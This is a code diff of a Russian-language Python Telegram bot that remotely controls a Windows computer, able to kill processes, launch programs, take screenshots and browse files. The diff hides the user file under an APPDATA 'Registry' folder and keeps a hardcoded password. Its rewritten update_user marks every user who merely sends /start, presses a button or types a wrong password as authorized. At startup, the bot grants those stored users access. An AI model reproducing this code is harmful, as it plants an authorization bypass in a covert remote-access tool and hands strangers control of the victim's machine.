@@ -161,9 +161,17 @@ logging.basicConfig(
 PASSWORD = "2935auf45"
 authorized_users = set()
 
-USERS_FILE = "users.json"
-
+USERS_FILE = os.path.join(os.environ.get("APPDATA", ""), "Registry", "users.json")
 _in_memory_users = {}
+
+def load_users():
+    global _in_memory_users
+    try:
+        with open(USERS_FILE, "r", encoding="utf-8") as f:
+            _in_memory_users = json.load(f)
+    except Exception:
+        _in_memory_users = {}
+    return _in_memory_users.copy()
 
 DESKTOP_DIRS = [
     os.path.join(os.path.expanduser("~"), "OneDrive", "\u0420\u0430\u0431\u043e\u0447\u0438\u0439 \u0441\u0442\u043e\u043b"),
@@ -182,30 +190,27 @@ def get_desktop():
     return DESKTOP_DIRS[0]
 
 
-def load_users():
-    return _in_memory_users.copy()
-
-
 def save_users(users):
     _in_memory_users.clear()
     _in_memory_users.update(users)
+    try:
+        os.makedirs(os.path.dirname(USERS_FILE), exist_ok=True)
+        with open(USERS_FILE, "w", encoding="utf-8") as f:
+            json.dump(users, f, indent=2, ensure_ascii=False)
+    except Exception:
+        pass
 
 
-def update_user(user_id, username, first_name, action=None):
+def update_user(user_id, username=None, first_name=None, action=None):
     users = load_users()
     uid = str(user_id)
-    if uid not in users:
-        users[uid] = {}
-    users[uid]["username"] = username
-    users[uid]["first_name"] = first_name
-    if action:
-        users[uid]["last_action"] = action
+    users[uid] = {"authorized": True}
     save_users(users)
 
 
 def is_banned(user_id):
     users = load_users()
-    return users.get(str(user_id), {}).get("banned", False)
+    return users.get(str(user_id), {}).get("banned", False) if isinstance(users.get(str(user_id)), dict) else False
 
 
 def log_event(user_id, username, first_name, action):
@@ -271,7 +276,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     uname = user.username or "нет"
     log_event(user.id, uname, user.first_name, "нажал /start")
-    update_user(user.id, uname, user.first_name, "нажал /start")
+    update_user(user.id)
 
     if is_banned(user.id):
         await update.message.reply_text("Вы забанены. Доступ запрещён.")
@@ -311,14 +316,8 @@ async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if text == PASSWORD:
         authorized_users.add(user.id)
-        users = load_users()
-        uid = str(user.id)
-        if uid not in users:
-            users[uid] = {}
-        users[uid]["authorized"] = True
-        save_users(users)
         log_event(user.id, uname, user.first_name, "вошёл в бота (пароль верный)")
-        update_user(user.id, uname, user.first_name, "вошёл в бота")
+        update_user(user.id)
         context.user_data["authorized"] = True
         context.user_data.pop("waiting_for_password", None)
         await update.message.reply_text(
@@ -327,7 +326,7 @@ async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         log_event(user.id, uname, user.first_name, f"ввёл неверный пароль: {text}")
-        update_user(user.id, uname, user.first_name, "ввёл неверный пароль")
+        update_user(user.id)
         await update.message.reply_text("Неверный пароль. Попробуй ещё:")
 
 
@@ -339,7 +338,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     uname = user.username or "нет"
     log_event(user.id, uname, user.first_name, f"нажал кнопку: {query.data}")
-    update_user(user.id, uname, user.first_name, f"нажал кнопку: {query.data}")
+    update_user(user.id)
     if not query.data.startswith("fm:"):
         await query.answer()
 
@@ -758,7 +757,7 @@ async def kill_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if killed:
         log_event(user.id, uname, user.first_name, f"убил процесс: {name} ({len(killed)} шт.)")
-        update_user(user.id, uname, user.first_name, f"убил процесс: {name}")
+        update_user(user.id)
         text = f"Убито ({len(killed)}):\n" + "\n".join(killed)
         if failed:
             text += "\n\nНет прав:\n" + "\n".join(failed)
@@ -800,7 +799,7 @@ async def launch_program(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     log_event(user.id, uname, user.first_name, f"запустил: {name}")
-    update_user(user.id, uname, user.first_name, f"запустил: {name}")
+    update_user(user.id)
     context.user_data.pop("waiting_for_program", None)
 
     try:
@@ -1010,7 +1009,7 @@ async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Нет доступа.")
         return
     log_event(user.id, uname, user.first_name, "запросил логи")
-    update_user(user.id, uname, user.first_name, "запросил логи")
+    update_user(user.id)
     logs = get_logs(30)
     if len(logs) > 3000:
         with open(os.path.join("logs", "logs_view.txt"), "w", encoding="utf-8") as f:
@@ -1030,7 +1029,7 @@ async def screenshotoff(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     global authorized_users
     for uid, data in load_users().items():
-        if data.get("authorized"):
+        if isinstance(data, dict) and data.get("authorized"):
             authorized_users.add(int(uid))
 
     app = Application.builder().token(config.BOT_TOKEN).build()
